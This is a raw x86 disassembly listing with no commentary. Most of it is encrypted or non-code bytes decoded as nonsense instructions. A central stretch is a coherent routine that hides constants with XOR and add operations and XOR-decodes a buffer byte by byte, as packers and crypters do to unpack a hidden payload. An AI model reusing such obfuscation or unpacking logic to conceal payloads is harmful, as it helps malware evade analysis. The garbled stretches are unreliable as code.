  403a37:	mov    ebx,0x30d60d37
  403a3c:	inc    ebx
  403a3d:	xor    edi,esi
  403a3f:	xchg   esp,ebp
  403a41:	xchg   edi,eax
  403a42:	adc    bl,dl
  403a44:	or     eax,0x845ab039
  403a49:	mov    eax,ds:0x9e085696
  403a4e:	hlt    
  403a4f:	int    0x3e
  403a51:	out    0x43,al
  403a53:	inc    ebx
  403a54:	stos   DWORD PTR es:[edi],eax
  403a55:	pop    eax
  403a56:	pop    ebp
  403a57:	test   al,0x77
  403a59:	clc    
  403a5a:	in     eax,dx
  403a5b:	xor    eax,0x9a6263c0
  403a60:	mov    eax,DWORD PTR [eax+0x7c3ed33d]
  403a66:	push   esi
  403a67:	sub    DWORD PTR [eax-0x50],esp
  403a6a:	shr    BYTE PTR [ecx],cl
  403a6c:	test   BYTE PTR [ecx+0x25],dl
  403a6f:	inc    ebx
  403a70:	push   esp
  403a71:	loopne 0x403abd
  403a73:	retf   0xef26
  403a76:	inc    esp
  403a77:	mov    ds:0xc03708bf,eax
  403a7c:	mov    ebx,0x6970d8c8
  403a81:	sub    DWORD PTR [esi-0x33544b93],eax
  403a87:	push   ds
  403a88:	sub    DWORD PTR [edx+0x5728d7ec],esi
  403a8e:	push   es
  403a8f:	loopne 0x403af6
  403a91:	dec    edi
  403a92:	push   ebp
  403a93:	dec    ecx
  403a94:	sbb    eax,esp
  403a96:	pop    ds
  403a97:	(bad)  [esi]
  403a99:	hlt    
  403a9a:	or     cl,dl
  403a9c:	bound  ecx,QWORD PTR [eax]
  403a9e:	xor    DWORD PTR [ebp-0x5b],esp
  403aa1:	sbb    ah,BYTE PTR [esi-0x7c]
  403aa4:	dec    esi
  403aa5:	sbb    BYTE PTR [ebx],bh
  403aa7:	iret   
  403aa8:	das    
  403aa9:	loopne 0x403add
  403aab:	cmp    bl,ch
  403aad:	dec    edi
  403aae:	sub    DWORD PTR [esi],ebx
  403ab0:	cmp    bh,dh
  403ab2:	or     ecx,DWORD PTR [ecx+0x3c2f4613]
  403ab8:	adc    ebp,DWORD PTR [ebx-0x26715fc7]
  403abe:	imul   edx,edi,0x25a36362
  403ac4:	call   0xd160:0xa72ab92f
  403acb:	lods   eax,DWORD PTR ds:[esi]
  403acc:	and    al,0x11
  403ace:	xor    ah,BYTE PTR [ebx+0x38ba67ad]
  403ad4:	fdivr  DWORD PTR [eax]
  403ad6:	xor    ebp,ecx
  403ad8:	sub    esi,esp
  403ada:	mov    cl,0xa2
  403adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403add:	(bad)  
  403ade:	dec    edx
  403adf:	test   BYTE PTR [esi+edi*2],cl
  403ae2:	mov    al,bl
  403ae4:	scas   eax,DWORD PTR es:[edi]
  403ae5:	or     BYTE PTR [ebp-0x1398bcf5],ah
  403aeb:	ret    0xe32b
  403aee:	inc    ebp
  403aef:	in     eax,0x18
  403af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403af2:	ret    
  403af3:	push   ebp
  403af4:	fs cmc 
  403af6:	shl    dh,cl
  403af8:	out    dx,al
  403af9:	ins    BYTE PTR es:[edi],dx
  403afa:	cmp    al,0xf4
  403afc:	sbb    DWORD PTR [ecx+0x72],ecx
  403aff:	mov    ch,0xfb
  403b01:	jmp    0x1e3926f3
  403b06:	mov    esp,0x442c362a
  403b0b:	pop    esp
  403b0c:	dec    esi
  403b0d:	cmp    BYTE PTR [eax-0x249344b5],dh
  403b13:	and    ah,BYTE PTR [ebx+0x4b9aef7c]
  403b19:	sub    edx,eax
  403b1b:	(bad)  
  403b1c:	lods   eax,DWORD PTR ds:[esi]
  403b1d:	jne    0x403b67
  403b1f:	test   BYTE PTR [eax-0x6e28acb7],al
  403b25:	aas    
  403b26:	repz jge 0x403b48
  403b29:	jmp    0x271b258d
  403b2e:	jae    0x403b41
  403b30:	dec    edi
  403b31:	xchg   DWORD PTR [esi+0x6650f304],ecx
  403b37:	push   edi
  403b38:	jo     0x403b00
  403b3a:	xchg   BYTE PTR [ebx],al
  403b3c:	xchg   edx,eax
  403b3d:	inc    esp
  403b3e:	mov    ebx,0x5f582b0c
  403b43:	aas    
  403b44:	lods   eax,DWORD PTR ds:[esi]
  403b45:	out    0x1e,al
  403b47:	pop    edi
  403b48:	push   edx
  403b49:	aaa    
  403b4a:	jno    0x403b23
  403b4c:	xor    al,0x89
  403b4e:	pop    ecx
  403b4f:	popa   
  403b50:	ja     0x403b6e
  403b52:	sub    bl,cl
  403b54:	mov    bh,0x10
  403b56:	adc    al,0xf
  403b58:	and    eax,0xee3e2d4c
  403b5d:	cmp    ecx,edx
  403b5f:	mul    DWORD PTR [esi-0x16e97d5]
  403b65:	invd   
  403b67:	jnp    0x403b6e
  403b69:	mov    ebp,0x7b6fb449
  403b6e:	jno    0x403bd2
  403b70:	mov    eax,0x1a0c3a38
  403b75:	adc    BYTE PTR [edx+edi*1+0x56],dl
  403b79:	div    BYTE PTR [ebx-0xc]
  403b7c:	out    0x9f,al
  403b7e:	scas   eax,DWORD PTR es:[edi]
  403b7f:	xchg   BYTE PTR [esi],ah
  403b81:	and    DWORD PTR [ebx-0x32],ebp
  403b84:	cmp    DWORD PTR ds:0x121e961e,edx
  403b8a:	sub    BYTE PTR [edi+ebx*8-0x4c24b8d9],0x33
  403b92:	mov    ebx,0xe61a7b99
  403b97:	cli    
  403b98:	sar    DWORD PTR [edi+0x79bcd924],1
  403b9e:	or     eax,0xc2560829
  403ba3:	dec    edx
  403ba4:	xlat   BYTE PTR ds:[ebx]
  403ba6:	push   esp
  403ba7:	nop
  403ba8:	jns    0x403b76
  403baa:	jmp    0xddda7cdd
  403baf:	add    eax,0x83164494
  403bb4:	call   0x4899b143
  403bb9:	push   esi
  403bba:	xor    al,0xef
  403bbc:	or     al,0xb8
  403bbe:	pop    ecx
  403bbf:	pop    ebx
  403bc0:	aaa    
  403bc1:	cmp    eax,0x1b171c6d
  403bc6:	cmp    esi,DWORD PTR [esi-0x2e]
  403bc9:	retf   0x85a6
  403bcc:	and    eax,0x9ebf20c1
  403bd1:	xor    DWORD PTR ds:0xab849167,edi
  403bd7:	gs mov ecx,0x1763609
  403bdd:	push   edi
  403bde:	lock dec esp
  403be0:	shr    DWORD PTR [ebp-0x7e3e58be],1
  403be6:	cli    
  403be7:	test   BYTE PTR [ecx],dl
  403be9:	push   ebx
  403bea:	mov    ah,0x79
  403bec:	mov    ds:0x1a59abad,eax
  403bf1:	xor    eax,0x410cc783
  403bf6:	enter  0x426f,0x5f
  403bfa:	pop    esp
  403bfb:	les    eax,FWORD PTR [edi+0x30870a3f]
  403c01:	mov    DWORD PTR cs:[esi+0x6b03f9b7],ebx
  403c08:	jl     0x403bda
  403c0a:	sbb    ebx,DWORD PTR [ecx-0x2a]
  403c0d:	sar    dh,cl
  403c0f:	jnp    0x403bf7
  403c11:	add    edi,DWORD PTR [eax]
  403c13:	loope  0x403c7f
  403c15:	pop    edi
  403c16:	jne    0x403bea
  403c18:	in     al,dx
  403c19:	in     al,0x7a
  403c1b:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  403c22:	mov    eax,DWORD PTR [ebp-0x38]
  403c25:	mov    edx,DWORD PTR [ebp-0x14]
  403c28:	xor    eax,esi
  403c2a:	add    eax,edi
  403c2c:	cmp    edx,eax
  403c2e:	je     0x40617c
  403c34:	mov    eax,DWORD PTR [ebp-0x20]
  403c37:	xor    eax,esi
  403c39:	mov    edx,0xffcd8d0b
  403c3e:	sub    edx,eax
  403c40:	add    edx,DWORD PTR [ebp-0x14]
  403c43:	mov    eax,DWORD PTR [ebp-0x20]
  403c46:	mov    ebx,DWORD PTR [ebp-0x10]
  403c49:	xor    eax,esi
  403c4b:	add    eax,edi
  403c4d:	imul   eax,ebx
  403c50:	cmp    eax,edx
  403c52:	ja     0x406179
  403c58:	mov    edx,DWORD PTR [ebp-0x10]
  403c5b:	mov    eax,DWORD PTR [ebp-0x14]
  403c5e:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c61:	sub    eax,edx
  403c63:	xor    ebx,esi
  403c65:	xor    edx,edx
  403c67:	add    ebx,edi
  403c69:	div    ebx
  403c6b:	mov    DWORD PTR [ebp-0x8],eax
  403c6e:	mov    eax,DWORD PTR [ebp-0x44]
  403c71:	mov    edx,DWORD PTR [ebp-0x8]
  403c74:	xor    eax,esi
  403c76:	add    eax,edi
  403c78:	cmp    edx,eax
  403c7a:	jbe    0x403c8a
  403c80:	mov    eax,DWORD PTR [ebp-0x44]
  403c83:	xor    eax,esi
  403c85:	add    eax,edi
  403c87:	mov    DWORD PTR [ebp-0x8],eax
  403c8a:	mov    eax,DWORD PTR [ebp-0x2c]
  403c8d:	mov    edx,DWORD PTR [ebp-0x8]
  403c90:	xor    eax,esi
  403c92:	add    eax,edi
  403c94:	imul   eax,edx
  403c97:	mov    DWORD PTR [ebp-0x8],eax
  403c9a:	mov    eax,DWORD PTR [ebp-0x38]
  403c9d:	mov    edx,DWORD PTR [ebp-0x8]
  403ca0:	xor    eax,esi
  403ca2:	add    eax,edi
  403ca4:	cmp    edx,eax
  403ca6:	je     0x406162
  403cac:	mov    eax,DWORD PTR [ebp-0x8]
  403caf:	mov    DWORD PTR [ebp-0x18],eax
  403cb2:	mov    eax,DWORD PTR [ebp-0x10]
  403cb5:	add    eax,DWORD PTR [ebp-0x54]
  403cb8:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403cbf:	mov    DWORD PTR [ebp-0x8],eax
  403cc2:	mov    eax,0xf89c85a2
  403cc7:	mov    DWORD PTR [ebp-0x28],eax
  403cca:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cd1:	mov    DWORD PTR [ebp-0x40],0xf89c85a0
  403cd8:	mov    DWORD PTR [ebp-0x30],eax
  403cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  403cde:	xor    eax,esi
  403ce0:	add    eax,edi
  403ce2:	jmp    0x40611e
  403ce7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  403cee:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cf5:	mov    eax,DWORD PTR [ebp-0x30]
  403cf8:	mov    edx,DWORD PTR [ebp-0xc]
  403cfb:	xor    eax,esi
  403cfd:	add    eax,edi
  403cff:	imul   eax,edx
  403d02:	mov    edx,DWORD PTR [ebp-0x8]
  403d05:	mov    al,BYTE PTR [eax+edx*1]
  403d08:	mov    BYTE PTR [ebp-0x1],al
  403d0b:	mov    eax,DWORD PTR [ebp-0x30]
  403d0e:	mov    edx,DWORD PTR [ebp-0xc]
  403d11:	xor    eax,esi
  403d13:	add    eax,edi
  403d15:	imul   eax,edx
  403d18:	mov    edx,DWORD PTR [ebp-0x5c]
  403d1b:	xor    edx,esi
  403d1d:	add    eax,edx
  403d1f:	mov    edx,DWORD PTR [ebp-0x8]
  403d22:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d2a:	mov    edx,DWORD PTR [ebp-0x4c]
  403d2d:	xor    edx,esi
  403d2f:	lea    eax,[edx+eax*1+0x3272f5]
  403d36:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3a:	xor    edx,eax
  403d3c:	mov    BYTE PTR [ebp-0x1],dl
  403d3f:	mov    al,BYTE PTR [ebp-0x1]
  403d42:	mov    edx,DWORD PTR [ebp-0x30]
  403d45:	mov    ebx,DWORD PTR [ebp-0xc]
  403d48:	xor    edx,esi
  403d4a:	add    edx,edi
  403d4c:	imul   edx,ebx
  403d4f:	mov    ebx,DWORD PTR [ebp-0x8]
  403d52:	mov    BYTE PTR [edx+ebx*1],al
  403d55:	mov    eax,DWORD PTR [ebp-0x30]
  403d58:	mov    edx,DWORD PTR [ebp-0xc]
  403d5b:	xor    eax,esi
  403d5d:	add    eax,edi
  403d5f:	imul   eax,edx
  403d62:	mov    edx,DWORD PTR [ebp-0x8]
  403d65:	mov    al,BYTE PTR [eax+edx*1]
  403d68:	mov    BYTE PTR [ebp-0x1],al
  403d6b:	mov    eax,DWORD PTR [ebp-0x30]
  403d6e:	mov    edx,DWORD PTR [ebp-0xc]
  403d71:	xor    eax,esi
  403d73:	add    eax,edi
  403d75:	imul   eax,edx
  403d78:	mov    edx,DWORD PTR [ebp-0x28]
  403d7b:	xor    edx,esi
  403d7d:	add    eax,edx
  403d7f:	mov    edx,DWORD PTR [ebp-0x8]
  403d82:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d8a:	mov    edx,DWORD PTR [ebp-0x50]
  403d8d:	xor    edx,esi
  403d8f:	lea    eax,[edx+eax*1+0x3272f5]
  403d96:	movzx  edx,BYTE PTR [ebp-0x1]
  403d9a:	xor    edx,eax
  403d9c:	mov    BYTE PTR [ebp-0x1],dl
  403d9f:	mov    al,BYTE PTR [ebp-0x1]
  403da2:	mov    edx,DWORD PTR [ebp-0x30]
  403da5:	mov    ebx,DWORD PTR [ebp-0xc]
  403da8:	xor    edx,esi
  403daa:	add    edx,edi
  403dac:	imul   edx,ebx
  403daf:	mov    ebx,DWORD PTR [ebp-0x8]
  403db2:	jmp    0x406107
  403db7:	dec    ebx
  403db8:	inc    eax
  403db9:	sub    eax,0xc4820296
  403dbe:	scas   al,BYTE PTR es:[edi]
  403dbf:	push   0x74dd8915
  403dc4:	jmp    0x403df8
  403dc6:	and    BYTE PTR [ebx+0x5e],cl
  403dc9:	add    DWORD PTR [ebx-0x7c7ca1b5],0x2
  403dd0:	jecxz  0x403d73
  403dd2:	jg     0x403dd6
  403dd4:	mov    DWORD PTR [edi-0xb79db2a],esp
  403dda:	jmp    0x4c5:0x46246658
  403de1:	mul    DWORD PTR [edx-0x729cc04f]
  403de7:	xor    al,0xfa
  403de9:	mov    eax,ds:0x6656670d
  403dee:	neg    dl
  403df0:	push   es
  403df1:	xor    al,0x92
  403df3:	invd   
  403df5:	ret    
  403df6:	rol    BYTE PTR [ebx+ecx*4+0x65],cl
  403dfa:	cs out dx,al
  403dfc:	dec    ebp
  403dfd:	inc    esp
  403dfe:	inc    edi
  403dff:	(bad)  
  403e00:	mov    cl,0x5a
  403e02:	or     BYTE PTR [edi+0xe],ah
  403e05:	in     eax,0x9b
  403e07:	jecxz  0x403e55
  403e09:	fidiv  WORD PTR [ebx-0x35]
  403e0c:	fdiv   DWORD PTR [edi-0x26]
  403e0f:	dec    ecx
  403e10:	mov    ecx,0x3eed9890
  403e15:	fsub   DWORD PTR [ecx]
  403e17:	fs ins DWORD PTR es:[edi],dx
  403e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e1a:	adc    dl,BYTE PTR [eax+0x5d]
  403e1d:	test   BYTE PTR [ebp+esi*1+0x6f],bl
  403e21:	ficomp DWORD PTR [edx+0x5cbfb892]
  403e27:	jl     0x403e4b
  403e29:	or     al,0x1f
  403e2b:	mov    ebp,0xf7e5b9bd
  403e30:	hlt    
  403e31:	icebp  
  403e32:	jae    0x403e56
  403e34:	cmp    al,0xa7
  403e36:	xchg   ebx,eax
  403e37:	push   0xb5e776ab
  403e3c:	xor    DWORD PTR [ebx+0x37],eax
  403e3f:	mov    dh,0xb5
  403e41:	outs   dx,BYTE PTR ds:[esi]
  403e42:	mov    esi,ebx
  403e44:	cld    
  403e45:	ss inc ecx
  403e47:	in     al,dx
  403e48:	xor    eax,0x9fa0b642
  403e4d:	and    BYTE PTR [ecx+ebx*8+0x21e02fb3],0x7a
  403e55:	sub    eax,0x21530cc4
  403e5a:	jg     0x403e11
  403e5c:	sbb    BYTE PTR [ecx+0x65],cl
  403e5f:	or     DWORD PTR [esi+0x69cdb753],esp
  403e65:	lock add BYTE PTR ds:0x3a6265b5,ah
  403e6c:	pop    ebx
  403e6d:	cs stos BYTE PTR es:[edi],al
  403e6f:	pop    ebp
  403e70:	mov    ds:0x13f81cd8,eax
  403e75:	ret    
  403e76:	xchg   BYTE PTR [edi+0x5335e675],dh
  403e7c:	mov    ds:0x567805ca,al
  403e81:	in     eax,dx
  403e82:	in     al,dx
  403e83:	add    ch,BYTE PTR [eax+0x7f4c4b37]
  403e89:	xchg   esi,eax
  403e8a:	popa   
  403e8b:	imul   edi,DWORD PTR [edx],0x5c
  403e8e:	push   0xffffffba
  403e90:	loopne 0x403e54
  403e92:	int3   
  403e93:	xor    al,0x17
  403e95:	adc    BYTE PTR [ecx-0x4ca5bbad],ch
  403e9b:	icebp  
  403e9c:	popa   
  403e9d:	hlt    
  403e9e:	add    ch,BYTE PTR ds:0xec3e3507
  403ea4:	inc    ecx
  403ea5:	or     al,0x81
  403ea7:	into   
  403ea8:	xchg   DWORD PTR [ecx+0x3ec8cf43],esp
  403eae:	addr16 mov esp,0x4dd2a3e3
  403eb4:	add    edx,esi
  403eb6:	shl    BYTE PTR [edx+edi*1],cl
  403eb9:	fnsave [eax]
  403ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ebc:	int    0xf1
  403ebe:	cmp    DWORD PTR [edi+0x7c],edi
  403ec1:	xlat   BYTE PTR ds:[ebx]
  403ec2:	sbb    eax,0xa8e65c2d
  403ec7:	dec    ebx
  403ec8:	mov    al,ds:0x2be7627c
  403ecd:	ret    0x6c88
  403ed0:	jmp    0xfeb66aa0
  403ed5:	gs jbe 0x403e86
  403ed8:	or     cl,BYTE PTR [ecx-0x60]
  403edb:	sbb    ecx,ebx
  403edd:	xor    eax,0x62b55ab6
  403ee2:	adc    DWORD PTR [edi+eiz*8],edx
  403ee5:	cmp    DWORD PTR [ebx+0x48dfff15],esp
  403eeb:	out    dx,al
  403eec:	add    eax,0x5b0e2ff2
  403ef1:	test   eax,0x642d7b1c
  403ef6:	in     al,0x9e
  403ef8:	outs   dx,DWORD PTR ds:[esi]
  403ef9:	(bad)  
  403efa:	in     al,dx
  403efb:	cmp    eax,0x6d50ce16
  403f00:	addr16 mov esi,0x9da17493
  403f06:	mov    eax,0xa40627cd
  403f0b:	lock jno 0x403f66
  403f0e:	push   ebx
  403f0f:	sahf   
  403f10:	mov    ds:0x6d84e52d,al
  403f15:	aam    0xe1
  403f17:	mov    esp,0x825fef08
  403f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f1d:	mov    edi,0x50bdddae
  403f22:	mov    es,edi
  403f24:	dec    esi
  403f25:	mov    ah,0xaf
  403f27:	enter  0x3e3e,0xab
  403f2b:	and    al,0xa6
  403f2d:	jge    0x403f50
  403f2f:	and    bl,BYTE PTR [ebx-0x70]
  403f32:	add    ah,dh
  403f34:	loop   0x403f50
  403f36:	fist   DWORD PTR [ecx+0xceaf28f]
  403f3c:	ror    BYTE PTR [esi+0x3f],0xa4
  403f40:	xor    BYTE PTR [ecx-0x5388131f],0xc1
  403f47:	push   cs
  403f48:	cmp    ecx,ebx
  403f4a:	retf   0xe7e0
  403f4d:	pop    esp
  403f4e:	jl     0x403f06
  403f50:	shl    BYTE PTR [ecx],cl
  403f52:	jbe    0x403f25
  403f54:	aad    0x20
  403f56:	mov    BYTE PTR [edi+0x62],ch
  403f59:	cmp    BYTE PTR ds:0xff9b271b,ch
  403f5f:	inc    ebp
  403f60:	aas    
  403f61:	pop    esi
  403f62:	enter  0x4413,0x55
  403f66:	test   DWORD PTR [esi-0x614b1331],0x5aa4ce3f
  403f70:	cld    
  403f71:	fiadd  WORD PTR [edx]
  403f73:	out    dx,al
  403f74:	dec    edx
  403f75:	and    eax,DWORD PTR [ecx-0xb5842a2]
  403f7b:	xchg   ecx,eax
  403f7c:	jbe    0x403f17
  403f7e:	fdivr  DWORD PTR [eax+0x6c]
  403f81:	mov    esp,0x32c760d1
  403f86:	retf   0x1036
  403f89:	fiadd  WORD PTR [ebx+ebp*1+0x4]
  403f8d:	jo     0x403f9a
  403f8f:	idiv   bh
  403f91:	mov    ebx,0x1b1272c9
  403f96:	jne    0x403f25
  403f98:	aad    0xfb
  403f9a:	lahf   
  403f9b:	cmp    eax,0x235f718c
  403fa0:	or     BYTE PTR [eax+0x4f],dl
  403fa3:	mov    al,ds:0x2fa8e8a2
  403fa8:	xchg   ebx,eax
  403fa9:	ins    DWORD PTR es:[edi],dx
  403faa:	adc    ecx,DWORD PTR [ebp+0x4191e99a]
  403fb0:	mov    cl,BYTE PTR [ebx+0x5956712e]
  403fb6:	cmp    BYTE PTR [edx+0x52],al
  403fb9:	xor    ah,BYTE PTR [esi-0x6f]
  403fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fbd:	jmp    0xf8c4:0x6d1fec46
  403fc4:	bound  eax,QWORD PTR [ecx+0x6e]
  403fc7:	ins    BYTE PTR es:[edi],dx
  403fc8:	aam    0x18
  403fca:	mov    bh,0x3c
  403fcc:	dec    esi
  403fcd:	jns    0x403f76
  403fcf:	cmp    DWORD PTR [ebp+0x75],0x9614c2db
  403fd6:	fdivr  DWORD PTR [edi-0x40]
  403fd9:	inc    ebx
  403fda:	mov    eax,ds:0x24ad2d80
  403fdf:	adc    ah,BYTE PTR [eax-0x2e]
  403fe2:	push   ss
  403fe3:	idiv   DWORD PTR [edi-0x5d]
  403fe6:	icebp  
  403fe7:	mov    ebp,0x28072958
  403fec:	mov    ds:0x908c0e3,eax
  403ff1:	xchg   edi,eax
  403ff2:	and    ebp,eax
  403ff4:	leave  
  403ff5:	inc    ecx
  403ff7:	cli    
  403ff8:	sbb    al,0xa8
  403ffa:	jbe    0x404041
  403ffc:	cli    
  403ffd:	xchg   ebp,eax
  403ffe:	add    BYTE PTR [esi-0x74e3cde5],ah
  404004:	scas   eax,DWORD PTR es:[edi]
  404005:	inc    esi
  404006:	cwde   
  404007:	xchg   ebp,eax
  404008:	repnz (bad) 
  40400a:	cmp    edi,DWORD PTR [edi]
  40400c:	add    ecx,DWORD PTR [eax-0x40d49c27]
  404012:	jmp    0x1a30:0x58f19716
  404019:	gs ja  0x403fef
  40401c:	pop    ecx
  40401d:	pop    eax
  40401e:	ds fcmovu st,st(2)
  404021:	sbb    BYTE PTR [ebp+0x60269dd2],dl
  404027:	pop    ebx
  404028:	aad    0x55
  40402a:	add    BYTE PTR ds:0x2e3d8617,ch
  404030:	out    dx,eax
  404031:	scas   al,BYTE PTR es:[edi]
  404032:	mov    dh,ah
  404034:	les    ecx,FWORD PTR [ebx-0x1f]
  404037:	outs   dx,BYTE PTR ds:[esi]
  404038:	cs aad 0x2c
  40403b:	or     eax,eax
  40403d:	push   cs
  40403e:	ins    BYTE PTR es:[edi],dx
  40403f:	adc    al,0x4b
  404041:	lds    edi,FWORD PTR [esi]
  404043:	popf   
  404044:	repnz popa 
  404046:	sbb    eax,0x8fab4d5
  40404b:	(bad)  [ebp+0x1e]
  40404e:	or     eax,0x30c06c58
  404053:	lods   eax,DWORD PTR ds:[esi]
  404054:	cmp    cl,BYTE PTR [esi+0x40a578af]
  40405a:	call   0x5ad550d1
  40405f:	push   ebx
  404060:	pop    esi
  404061:	sbb    DWORD PTR [ecx],ecx
  404063:	sbb    eax,0x3a1a4377
  404068:	sti    
  404069:	std    
  40406a:	pop    edi
  40406b:	retf   
  40406c:	jecxz  0x403fee
  40406e:	mov    dh,0xa0
  404070:	mov    WORD PTR [esi+0x4e],cs
  404073:	ffree  st(6)
  404075:	jmp    0xbe917ee8
  40407a:	adc    BYTE PTR [ecx-0x129ec02f],ch
  404080:	stos   DWORD PTR es:[edi],eax
  404081:	xchg   esi,eax
  404082:	(bad)  
  404083:	xchg   esp,eax
  404084:	test   DWORD PTR [esi],0x6ce057b5
  40408a:	dec    eax
  40408b:	adc    al,0x23
  40408d:	cmc    
  40408e:	call   0x88efa6bd
  404093:	xchg   ebx,eax
  404094:	out    dx,al
  404095:	xchg   edi,eax
  404096:	mov    edx,edx
  404098:	jnp    0x4040a7
  40409a:	sbb    ecx,0x29
  40409d:	xchg   ebx,eax
  40409e:	cs test ch,dl
  4040a1:	sbb    eax,0x3fa3c861
  4040a6:	loop   0x4040a7
  4040a8:	test   BYTE PTR [edx-0x1c6aa86e],bh
  4040ae:	inc    eax
  4040af:	aad    0xd8
  4040b1:	mov    ah,0xf5
  4040b3:	xor    BYTE PTR [ebx-0x7e],cl
  4040b6:	xchg   ebx,eax
  4040b7:	add    cl,BYTE PTR [ebp-0x2d]
  4040ba:	push   ecx
  4040bb:	call   0xee6a:0xf6995575
  4040c2:	xchg   edi,eax
  4040c3:	(bad)  
  4040c4:	inc    edi
  4040c5:	mov    eax,ds:0x34f73fec
  4040ca:	add    dl,BYTE PTR [ecx-0x18]
  4040cd:	repz loop 0x40414e
  4040d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d1:	add    bh,dh
  4040d3:	or     DWORD PTR [eax],ecx
  4040d5:	push   0xd0048972
  4040da:	and    DWORD PTR [eax+ecx*4-0x62],ebp
  4040de:	xor    BYTE PTR [ecx+eiz*8-0x2c],0xa2
  4040e3:	(bad)  
  4040e4:	pop    esp
  4040e5:	mov    gs,WORD PTR [esi-0x6b510a18]
  4040eb:	sahf   
  4040ec:	jmp    0x2ccbb4d
  4040f1:	mov    ds:0x462f351b,eax
  4040f6:	mov    eax,ds:0x6091739c
  4040fb:	jmp    0xa264f844
  404100:	cmc    
  404101:	pop    ebp
  404102:	jp     0x40414f
  404104:	adc    al,0xa5
  404106:	loope  0x404173
  404108:	ss fwait
  40410a:	inc    esi
  40410b:	mov    ah,0x81
  40410d:	xchg   ecx,eax
  40410e:	adc    eax,esi
  404110:	inc    ebx
  404111:	push   ebx
  404112:	shl    BYTE PTR [edx-0x12bbeb46],0xb3
  404119:	xchg   DWORD PTR [edi],ebp
  40411b:	out    dx,eax
  40411c:	sbb    esi,DWORD PTR [ebp-0x32]
  40411f:	fistp  QWORD PTR [esi+0x6b]
  404122:	xor    al,0xe9
  404124:	xchg   ecx,eax
  404125:	mov    esp,0xd972cedc
  40412a:	inc    ecx
  40412b:	xchg   edx,eax
  40412c:	push   ebx
  40412d:	jne    0x40415b
  40412f:	dec    edi
  404130:	jge    0x404125
  404132:	mov    gs,WORD PTR [edx]
  404134:	repz mov edx,DWORD PTR [ebp+0x7e]
  404138:	mov    edx,0x40d35f62
  40413d:	int    0x56
  40413f:	fild   DWORD PTR [ebp+0x7324bba5]
  404145:	into   
  404146:	xor    DWORD PTR [ebp-0x5bc508c0],0x88cfe27b
  404150:	test   eax,0x241738d1
  404155:	repz push eax
  404157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404158:	pop    edi
  404159:	enter  0x682e,0x61
  40415d:	xchg   ebx,eax
  40415e:	xor    DWORD PTR [ebx-0x3ff8a486],esp
  404164:	loop   0x4040fd
  404166:	sbb    dh,BYTE PTR [edx-0xc909ec5]
  40416c:	inc    esi
  40416d:	repz adc eax,0x2249c998
  404173:	ja     0x404130
  404175:	jo     0x4041e3
  404177:	sbb    BYTE PTR [edx],dl
  404179:	dec    ebp
  40417a:	sub    BYTE PTR [ebx],al
  40417c:	add    al,0xa1
  40417e:	test   DWORD PTR [edx-0x16],esp
  404181:	add    eax,0x23b81414
  404186:	nop
  404187:	fcomi  st,st(6)
  404189:	dec    eax
  40418a:	jle    0x4041db
  40418c:	lock adc dl,BYTE PTR ss:[eax]
  404190:	jae    0x40414c
  404192:	test   ah,ch
  404194:	leave  
  404195:	dec    esi
  404196:	jno    0x4041a2
  404198:	and    BYTE PTR [eax-0x4b513206],bh
  40419e:	xchg   esi,eax
  40419f:	int    0x32
  4041a1:	sub    eax,DWORD PTR [ebx+0x70]
  4041a4:	or     ecx,DWORD PTR [edx+edx*8+0x1e]
  4041a8:	in     eax,0xb9
  4041aa:	push   esp
  4041ab:	push   ss
  4041ac:	mul    BYTE PTR [ebp+esi*1-0x46]
  4041b0:	fcom   DWORD PTR [eax-0x46]
  4041b3:	pavgb  mm2,QWORD PTR [edx]
  4041b6:	mov    dl,0x9c
  4041b8:	into   
  4041b9:	sub    dl,BYTE PTR ds:0xa1b6d9f7
  4041bf:	fcomp  st(0)
  4041c1:	sti    
  4041c2:	xor    ah,al
  4041c4:	cwde   
  4041c5:	xlat   BYTE PTR ds:[ebx]
  4041c6:	sub    BYTE PTR [esi+edi*2-0x46],dh
  4041ca:	cmp    esi,eax
  4041cc:	fldz   
  4041ce:	push   cs
  4041cf:	test   eax,0xc25191b3
  4041d4:	pop    ss
  4041d5:	test   esi,edi
  4041d7:	clc    
  4041d8:	ror    esp,cl
  4041da:	pusha  
  4041db:	outs   dx,BYTE PTR ds:[esi]
  4041dc:	aas    
  4041dd:	jle    0x4041b3
  4041df:	jle    0x40422f
  4041e1:	gs aaa 
  4041e3:	and    eax,DWORD PTR [esi+0x51]
  4041e6:	push   0x45597929
  4041eb:	add    BYTE PTR [ebx+0x5078e0e],0xec
  4041f2:	mov    cs,WORD PTR [edx]
  4041f4:	test   BYTE PTR [ebp-0x33],cl
  4041f7:	mov    eax,ds:0x539685bc
  4041fc:	dec    ecx
  4041fd:	test   BYTE PTR [ecx-0x3d],ah
  404200:	je     0x404256
  404202:	ror    BYTE PTR [ebx],0x6a
  404205:	scas   eax,DWORD PTR es:[edi]
  404206:	mov    edi,0x29f207a5
  40420b:	in     eax,dx
  40420c:	cmp    ch,BYTE PTR [ebx+0x2]
  40420f:	int3   
  404210:	scas   al,BYTE PTR es:[edi]
  404211:	outs   dx,DWORD PTR ds:[esi]
  404212:	(bad)  
  404213:	pop    ebx
  404214:	push   esp
  404215:	mov    ch,0x94
  404217:	or     eax,0x34da2d30
  40421c:	pop    ss
  40421d:	lods   eax,DWORD PTR ds:[esi]
  40421e:	pop    esi
  40421f:	sar    dh,cl
  404221:	jecxz  0x404219
  404223:	and    ebx,ebp
  404225:	push   edi
  404226:	imul   esp,DWORD PTR [esi+0x2d3178c0],0xffffffa0
  40422d:	sbb    al,0x82
